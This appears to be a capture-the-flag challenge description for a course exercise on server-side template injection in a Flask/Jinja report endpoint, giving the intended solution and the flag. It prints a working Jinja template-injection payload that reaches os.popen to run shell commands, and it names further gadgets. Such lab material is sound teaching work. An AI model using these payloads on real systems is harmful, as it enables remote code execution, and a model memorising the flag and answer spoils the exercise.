# WEB-03 — Server-Side Template Injection

## Category
Web vulnerability

## Objective
Exploit an SSTI vulnerability in the report-generation function to achieve
remote code execution and read the flag file from the server.

## Vulnerability
User-controlled input (`name`) is concatenated into a string that is then passed
to Jinja's `render_template_string`, so the input is evaluated as a template
server-side. This allows arbitrary Jinja expression evaluation, which escalates
to Python code execution.

## Service
Flask app on TCP port 5000 (published on 8084). `GET /report?name=<input>`.

## Flag location
The flag is **not** exposed as a template variable — `{{FLAG}}` will not resolve,
because it is a module global outside the render context. The flag is shipped as
`flag.txt` in the app's working directory (`/app/flag.txt`, see the Dockerfile),
so the intended path is SSTI → RCE → read that file.

## Intended Technique
1. Confirm injection: `GET /report?name={{7*7}}` returns `49`.
2. Escalate to RCE via the Jinja object chain, e.g.:
   ```
   /report?name={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
   ```
   (any standard Jinja SSTI-to-RCE gadget works — `subprocess`/`os` via
   `__globals__`, `__subclasses__`, etc.)
3. Read `flag.txt` from the working directory to recover the flag.

## Flag
CITS3006{WEB03_SSTI_TEMPLATE_INJECTION}
